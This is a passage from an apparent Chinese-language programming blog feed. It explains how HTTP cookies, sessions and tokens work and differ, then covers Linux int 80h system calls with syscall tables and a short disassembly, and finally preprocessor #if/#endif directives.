个。</p><p><br>执行流程：</p><blockquote><p> A：首先，客户端会发送一个http请求到服务器端。</p><p> B： 服务器端接受客户端请求后，发送一个http响应到客户端，这个响应头，其中就包含Set-Cookie头部。</p><p>C：在客户端发起的第二次请求（注意：如果服务器需要我们带上Cookie，我们就需要在B步骤上面拿到这个Cookie然后作为请求头一起发起第二次请求），提供给了服务器端可以用来唯一标识客户端身份的信息。这时，服务器端也就可以判断客户端是否启用了cookies。尽管，用户可能在和应用程序交互的过程中突然禁用cookies的使用，但是，这个情况基本是不太可能发生的，所以可以不加以考虑，这在实践中也被证明是对的。</p></blockquote><p><br>为了方便理解，可以先看下这张流程执行图加深概念:</p><p><img src="/images/88-1.png" alt></p><p> 那么，在浏览器上面的请求头和Cookie在那？下图给大家截取了其中一种:</p><p><img src="/images/88-2.png" alt></p></blockquote><h3 id="二、Session"><a href="#二、Session" class="headerlink" title="二、Session"></a><font color="brown">二、Session</font></h3><blockquote><p>Session是对于服务端来说的，客户端是没有Session一说的。Session是服务器在和客户端建立连接时添加客户端连接标志，最终会在服务器软件（Apache、Tomcat、JBoss）转化为一个临时Cookie发送给给客户端，当客户端第一请求时服务器会检查是否携带了这个Session（临时Cookie），如果没有则会添加Session，如果有就拿出这个Session来做相关操作。</p><p><br>在这里引用别人家的一个小故事来加深印象：</p><blockquote><p>在说session是啥之前，我们先来说说为什么会出现session会话，它出现的机理是什么？</p><p><br>我们知道，我们用浏览器打开一个网页，用到的是HTTP协议，了解计算机的应该都知道这个协议，它是无状态的，什么是无状态呢？就是说这一次请求和上一次请求是没有任何关系的，互不认识的，没有关联的。但是这种无状态的的好处是快速。所以就会带来一个问题就是，我希望几个请求的页面要有关联，比如：我在www.a.com/login.php里面登陆了，我在www.a.com/index.php 也希望是登陆状态，但是，这是2个不同的页面，也就是2个不同的HTTP请求，这2个HTTP请求是无状态的，也就是无关联的，所以无法单纯的在index.php中读取到它在login.php中已经登陆了！</p><p><br>那咋搞呢？我不可能这2个页面我都去登陆一遍吧。或者用笨方法这2个页面都去查询数据库，如果有登陆状态，就判断是登陆的了。这种查询数据库的方案虽然可行，但是每次都要去查询数据库不是个事，会造成数据库的压力。所以正是这种诉求，这个时候，一个新的客户端存储数据方式出现了：cookie。cookie是把少量的信息存储在用户自己的电脑上，它在一个域名下是一个全局的，只要设置它的存储路径在域名www.a.com下 ，那么当用户用浏览器访问时，php就可以从这个域名的任意页面读取cookie中的信息。所以就很好的解决了我在www.a.com/login.php页面登陆了，我也可以在www.a.com/index.php获取到这个登陆信息了。</p><p><br>同时又不用反复去查询数据库。虽然这种方案很不错，也很快速方便，但是由于cookie 是存在用户端，而且它本身存储的尺寸大小也有限，最关键是用户可以是可见的，并可以随意的修改，很不安全。那如何又要安全，又可以方便的全局读取信息呢？于是，这个时候，一种新的存储会话机制：session 诞生了。</p><p><br> Session 就是在一次会话中解决2次HTTP的请求的关联，让它们产生联系，让2两个页面都能读取到找个这个全局的session信息。session信息存在于服务器端，所以也就很好的解决了安全问题。</p></blockquote></blockquote><h3 id="三、Token"><a href="#三、Token" class="headerlink" title="三、Token"></a><font color="brown">三、Token</font></h3><blockquote><p>token是用户身份的验证方式，我们通常叫它：令牌。最简单的token组成:uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign(签名，由token的前几位+盐以哈希算法压缩成一定长的十六进制字符串，可以防止恶意第三方拼接token请求服务器)。还可以把不变的参数也放进token，避免多次查库。</p><p><br>应用场景：</p><p><br>A：当用户首次登录成功（注册也是一种可以适用的场景）之后, 服务器端就会生成一个 token 值，这个值，会在服务器保存token值(保存在数据库中)，再将这个token值返回给客户端.</p><p>B：客户端拿到 token 值之后,进行本地保存。（SP存储是大家能够比较支持和易于理解操作的存储）</p><p>C：当客户端再次发送网络请求(一般不是登录请求)的时候,就会将这个 token 值附带到参数中发送给服务器.</p><p>D：服务器接收到客户端的请求之后,会取出token值与保存在本地(数据库)中的token值做对比</p><p><br>对比一：如果两个 token 值相同， 说明用户登录成功过!当前用户处于登录状态!</p><p>对比二：如果没有这个 token 值, 则说明没有登录成功.</p><p>对比三：如果 token 值不同: 说明原来的登录信息已经失效,让用户重新登录.</p></blockquote><h3 id="四、三者的区别"><a href="#四、三者的区别" class="headerlink" title="四、三者的区别"></a><font color="brown">四、三者的区别</font></h3><h4 id="1-Cookie和Session的区别"><a href="#1-Cookie和Session的区别" class="headerlink" title="1. Cookie和Session的区别"></a><font color="navy">1. Cookie和Session的区别</font></h4><blockquote><ol><li>cookie数据存放在客户的浏览器上，session数据放在服务器上。</li><li>cookie不是很安全，别人可以分析存放在本地的cookie并进行cookie欺骗,考虑到安全应当使用session。</li><li>session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能,考虑到减轻服务器性能方面，应当使用cookie。</li><li>单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。</li><li>所以个人建议：<ul><li>将登陆信息等重要信息存放为session</li><li>其他信息如果需要保留，可以放在cookie中</li></ul></li></ol></blockquote><h4 id="2-Token-和-Session-的区别"><a href="#2-Token-和-Session-的区别" class="headerlink" title="2. Token 和 Session 的区别"></a><font color="navy">2. Token 和 Session 的区别</font></h4><blockquote><p>Session和 token并不矛盾，作为身份认证token安全性比session好，因为每个请求都有签名还能防止监听以及重放攻击，而session就必须靠链路层来保障通讯安全了。如上所说，如果你需要实现有状态的会话，仍然可以增加session来在服务器端保存一些状态。</p><p><br>App通常用restful api跟server打交道。Rest是stateless的，也就是app不需要像browser那样用cookie来保存session,因此用session token来标示自己就够了，session/state由api server的逻辑处理。如果你的后端不是stateless的rest api,那么你可能需要在app里保存session.可以在app里嵌入webkit,用一个隐藏的browser来管理cookie session.</p><p><br>Session是一种HTTP存储机制，目的是为无状态的HTTP提供的持久机制。所谓Session认证只是简单的把User信息存储到Session里，因为SID的不可预测性，暂且认为是安全的。这是一种认证手段。而Token，如果指的是OAuth Token或类似的机制的话，提供的是 认证 和 授权 ，认证是针对用户，授权是针对App。其目的是让 某App有权利访问 某用户 的信息。这里的Token是唯一的。不可以转移到其它App上，也不可以转到其它 用户 上。转过来说Session。Session只提供一种简单的认证，即有此SID，即认为有此User的全部权利。是需要严格保密的，这个数据应该只保存在站方，不应该共享给其它网站或者第三方App。所以简单来说，如果你的用户数据可能需要和第三方共享，或者允许第三方调用API接口，用Token。如果永远只是自己的网站，自己的App，用什么就无所谓了。</p><p><br>token就是令牌，比如你授权（登录）一个程序时，他就是个依据，判断你是否已经授权该软件；cookie就是写在客户端的一个txt文件，里面包括你登录信息之类的，这样你下次在登录某个网站，就会自动调用cookie自动登录用户名；session和cookie差不多，只是session是写在服务器端的文件，也需要在客户端写入cookie文件，但是文件里是你的浏览器编号.Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端。</p></blockquote><h3 id="四、相关文章"><a href="#四、相关文章" class="headerlink" title="四、相关文章"></a><font color="brown">四、相关文章</font></h3><blockquote><ol><li><a href="https://mp.weixin.qq.com/s/b8h6_3CMlwsE8PtkrPr9FA" target="_blank" rel="noopener">Cookie、Session、Token那点事儿</a></li><li><a href="https://segmentfault.com/a/1190000017831088" target="_blank" rel="noopener">彻底弄懂session，cookie，token</a></li><li><a href="https://www.cnblogs.com/hwlong/p/9224251.html" target="_blank" rel="noopener">★★★★  Cookie、Session、Token  ★★★★</a></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;来自：简书，作者：骑小猪看流星&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;链接：&lt;a href=&quot;https://www.jianshu.com/p/bd1be47a16c1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;h
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>有关内核调用问题和预编译指令</title>
    <link href="https://muzibing.github.io/2019/11/05/2019.11.05%EF%BC%8887%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/11/05/2019.11.05（87）/</id>
    <published>2019-11-04T16:00:00.000Z</published>
    <updated>2019-11-06T03:58:12.597Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、知识点摘要"><a href="#一、知识点摘要" class="headerlink" title="一、知识点摘要"></a><font color="brown">一、知识点摘要</font></h3><blockquote><ol><li>系统调用 int 80h 中断</li><li>#ifdef ……# endif 的含义和用法</li></ol></blockquote><h3 id="二、知识点介绍"><a href="#二、知识点介绍" class="headerlink" title="二、知识点介绍"></a><font color="brown">二、知识点介绍</font></h3><h4 id="1-int-80h-中断"><a href="#1-int-80h-中断" class="headerlink" title="1.int 80h 中断"></a><font color="navy">1.int 80h 中断</font></h4><blockquote><font color="orange">1) 什么是 system call?</font><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system call 是指运行在使用者空间的程序向操作系统内核请求需要更高权限运行的服务。system call 提供了用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态执行。如设备IO操作或者进程间通信 。(<a href="[https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F](https://zh.wikipedia.org/wiki/操作系统">操作系统—WIKI</a> ))</p><p><br><font color="orange">2) 什么是 int 80h 中断？</font></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Linux 的 system call 就是通过<code>int 80h</code>来实现的，<code>int 80h</code> 是通过<font color="red">系统调用号</font>来区分入口的函数。</p><p><br><font color="orange">3) 操作系统实现 <code>system call</code> 的基本过程:</font></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;①&nbsp;&nbsp;应用程序调用库函数（API）；</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;②&nbsp;&nbsp;API 将系统调用号存入 eax，然后通过中断调用使系统进入内核态；</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③&nbsp;&nbsp;内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④&nbsp;&nbsp;系统调用完成相应功能，将返回值存入eax，返回到中断处理函数；</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑤&nbsp;&nbsp;中断处理函数返回到 API 中；</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑥&nbsp;&nbsp;API 将 eax 返回给应用程序。<br><br><font color="orange">4) 系统调用号</font></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们再来想几个小问题：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;※ 系统调用号定义在哪里？</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Linux 的系统调用号定义在了 <code>/usr/include/asm/unistd.h</code> 文件中，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta"># cat /usr/<span class="meta-keyword">include</span>/asm/unistd.h</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment">/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_H</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_H</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment">/* x32 syscall flag bit */</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __X32_SYSCALL_BIT0x40000000</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta"># <span class="meta-keyword">ifdef</span> __i386__</span></span><br><span class="line">&gt; <span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd_32.h&gt;</span></span></span><br><span class="line">&gt; <span class="meta"># <span class="meta-keyword">elif</span> defined(__ILP32__)</span></span><br><span class="line">&gt; <span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd_x32.h&gt;</span></span></span><br><span class="line">&gt; <span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">&gt; <span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd_64.h&gt;</span></span></span><br><span class="line">&gt; <span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_H */</span></span></span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;再来简单的看一下 <code>unistd_x32</code> 、<code>unisted_32</code>和 <code>unisted64</code> 中的信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&gt; #/usr/include/<span class="keyword">asm</span>/unistd_x32.h</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_X32_H</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_X32_H 1</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_read (__X32_SYSCALL_BIT + 0)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_write (__X32_SYSCALL_BIT + 1)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_open (__X32_SYSCALL_BIT + 2)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_close (__X32_SYSCALL_BIT + 3)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_stat (__X32_SYSCALL_BIT + 4)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_fstat (__X32_SYSCALL_BIT + 5)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_lstat (__X32_SYSCALL_BIT + 6)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_poll (__X32_SYSCALL_BIT + 7)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_lseek (__X32_SYSCALL_BIT + 8)</span></span><br><span class="line">&gt; …………………………………………………………………………</span><br><span class="line">&gt; </span><br><span class="line">&gt; #/usr/include/<span class="keyword">asm</span>/unistd_32.h</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_32_H</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_32_H 1</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_restart_syscall 0</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_exit 1</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_fork 2</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_read 3</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_write 4</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_open 5</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_close 6</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_waitpid 7</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_creat 8</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_link 9</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_unlink 10</span></span><br><span class="line">&gt; …………………………………………………………………………</span><br><span class="line">&gt; </span><br><span class="line">&gt; #/usr/include/<span class="keyword">asm</span>/unistd_64.h</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_read 0</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_write 1</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_open 2</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_close 3</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_stat 4</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_fstat 5</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_lstat 6</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_poll 7</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_lseek 8</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_mmap 9</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_mprotect 10</span></span><br><span class="line">&gt; …………………………………………………………………………</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;※ 系统调用号的含义是什么？</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于不同的系统调用号，所代表的入口函数是不一样的，其实我们在上面的定义中就能知道不同序号代表的函数是什么，下面我以 32 位的系统给出几个系统调用表对应的函数：</p><p><img src="/images/87-1.jpg" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;※ 如何执行 <code>system call</code> ?</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这里，我们用一个例子来详细的解释一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; .text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">&gt; .text:08048089                 mov     dl, 14h         ; len，对应参数为：size_t count</span><br><span class="line">&gt; .text:0804808B                 mov     bl, 1           ; fd，对应参数 fd，fd = 1，在linux 中对应于 stdout，指的是显示屏的标准输出</span><br><span class="line">&gt; .text:0804808D                 mov     al, 4   ; 系统调用号为 4，sys_write</span><br><span class="line">&gt; .text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">&gt; .text:08048091                 xor     ebx, ebx; ebx = 0，对应的参数 fd = 0，在 Linux 中对应于 stdin，指的是显示屏的标准输入</span><br><span class="line">&gt; .text:08048093                 mov     dl, 3Ch; len，对应参数为：size_t count</span><br><span class="line">&gt; .text:08048095                 mov     al, 3   ; 系统调用号为3，sys_read</span><br><span class="line">&gt; .text:08048097                 int     80h             ; LINUX - sys_read</span><br><span class="line">&gt; .text:08048099                 add     esp, 14h</span><br><span class="line">&gt; .text:0804809C                 retn</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将上面的汇编语言反汇编成伪代码，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; sys_write(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">char</span> * buf, <span class="keyword">size_t</span> count);</span><br><span class="line">&gt; </span><br><span class="line">&gt; sys_read(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">char</span> * buf, <span class="keyword">size_t</span> count);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="2-if……-endif"><a href="#2-if……-endif" class="headerlink" title="2.#if……# endif"></a><font color="navy">2.#if……# endif</font></h4><blockquote><font color="orange">1)  \#if……\#endif 是什么？</font><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #if ……#endif 其实是 <code>C#</code>两个预处理器指令， 如果 C# 编译器遇到最后面跟有 <a href="http://technet.microsoft.com/zh-cn/hyx43has(v=vs.85" target="_blank" rel="noopener">#endif</a>) 指令的#if 指令，则仅当指定的符号已定义时，它才会编译这两个指令之间的代码。 例如：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; --在最顶端必须声明自定义的名称DEBUG或者START</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> DEBUG  </span></span><br><span class="line">&gt; <span class="comment">//#define START</span></span><br><span class="line">&gt; <span class="comment">//using System;</span></span><br><span class="line">&gt; <span class="comment">//...</span></span><br><span class="line">&gt;  </span><br><span class="line">&gt;  </span><br><span class="line">&gt;     在你需要的代码中插入<span class="meta">#<span class="meta-keyword">if</span>..#<span class="meta-keyword">endif</span>，编译器会自动寻找，并执行之间的这段代码</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">if</span> DEBUG</span></span><br><span class="line">&gt;      Console.WriteLine(<span class="string">"Debug version"</span>);</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&gt;  </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">if</span> START</span></span><br><span class="line">&gt;      Console.WriteLine(<span class="string">"START PROCESS"</span>);</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p><br><font color="orange">2)  预处理器的指令还有哪些？</font></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-if" target="_blank" rel="noopener">#if</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-else" target="_blank" rel="noopener">#else</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-elif" target="_blank" rel="noopener">#elif</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-endif" target="_blank" rel="noopener">#endif</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-define" target="_blank" rel="noopener">#define</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-undef" target="_blank" rel="noopener">#undef</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-warning" target="_blank" rel="noopener">#warning</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-error" target="_blank" rel="noopener">#error</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-line" target="_blank" rel="noopener">#line</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-region" target="_blank" rel="noopener">#region</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-endregion" target="_blank" rel="noopener">#endregion</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-pragma" target="_blank" rel="noopener">#pragma</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-pragma-warning" target="_blank" rel="noopener">#pragma warning</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-pragma-checksum" target="_blank" rel="noopener">#pragma checksum</a> </p><p><br><font color="orange">3)  #if 0，#if 1，#else，#endif语句 </font></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;     code1</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">&gt; </span><br><span class="line">&gt;     code2</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时code1的语句被注释掉了，永远没有办法执行，而code2是被编译的；如果将#if 0变为#if 1，code1被编译，而code2永远没有办法被执行。 </p></blockquote><h3 id="三、相关知识点"><a href="#三、相关知识点" class="headerlink" title="三、相关知识点"></a><font color="brown">三、相关知识点</font></h3><blockquote><ol><li>操作系统的内核和用户的关系</li><li>Linux下 文件描述符（fd）与 文件指针（FILE*）</li><li>C语言的 open, read, write函数，及文件读写</li></ol></blockquote><h3 id="四、参考文章"><a href="#四、参考文章" class="headerlink" title="四、参考文章"></a><font color="brown">四、参考文章</font></h3><blockquote><ol><li><a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">Linux系统调用 int 80h int 0x80</a> ★★★★</li><li><a href="http://www.voidcn.com/article/p-avzzaclp-bkb.html" target="_blank" rel="noopener">《第一篇 linux 0.12 系统调用(int 0x80)详解》</a>★★</li><li><a href="https://blog.csdn.net/m2o2o2d/article/details/21648777" target="_blank" rel="noopener">int 0x80系统调用的参数传递规则</a></li><li><a href="https://blog.csdn.net/wukery/article/details/79295567" target="_blank" rel="noopener">linux系统调用表(system call table)</a>★★★★</li><li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-if" target="_blank" rel="noopener">#if（C# 参考）</a></li><li><a href="https://blog.csdn.net/weixin_44973055/article/details/90233454" target="_blank" rel="noopener">C# 